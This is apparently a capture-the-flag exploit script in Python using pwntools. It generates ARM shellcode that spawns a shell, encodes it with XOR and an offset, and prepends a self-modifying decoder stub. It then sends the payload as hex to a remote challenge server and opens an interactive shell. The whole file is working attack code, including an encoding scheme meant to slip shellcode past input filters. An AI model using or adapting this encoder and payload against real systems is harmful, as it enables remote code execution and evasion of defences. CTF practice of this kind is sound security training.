from pwn import *

context.arch = 'arm'
context.os = 'linux'
context.log_level = 'debug'

# New shellcode
new_shellcode = asm(shellcraft.sh())

# Encode the shellcode using XOR with a key (for example, key = 0xAA)
key = 0xaa
offset = 0x12
encoded_shellcode = bytes([((byte-offset)%256) ^ key for byte in new_shellcode])

# Length of the encoded shellcode
length_of_encoded_shellcode = len(encoded_shellcode)

# Self-modifying shellcode to decode the XOR'ed shellcode at runtime
asm_code = f"""
    mov r1, pc
    add r1, r1, #32
    mov r2, #{length_of_encoded_shellcode}
    mov r3, #{key}

decode_loop:
    ldrb r4, [r1]
    eor r4, r4, r3
    add r4, r4, #{offset}
    strb r4, [r1], #1
    subs r2, r2, #1
    bne decode_loop
"""

# Generate the binary shellcode from the assembly code
smc_shellcode = asm(asm_code)
print(len(smc_shellcode))

# Final shellcode is the combination of SMC shellcode and encoded shellcode
final_shellcode = smc_shellcode + encoded_shellcode
print('\n\n\n\n\n')
# p = run_shellcode(final_shellcode)
# p.interactive()
# quit()

# Convert the shellcode to hexadecimal string
final_shellcode_hex = final_shellcode.hex()

# Now, you can send this hex shellcode to the target
# For demonstration, let's print it
print(final_shellcode_hex)
print(f'[*]     Instruction Count: {len(final_shellcode)/4}')

# Convert the shellcode to hexadecimal string
final_shellcode_hex = final_shellcode.hex()

io = remote("chall.pwnoh.io", 13375)

io.sendline(final_shellcode_hex)
io.interactive()

io.close()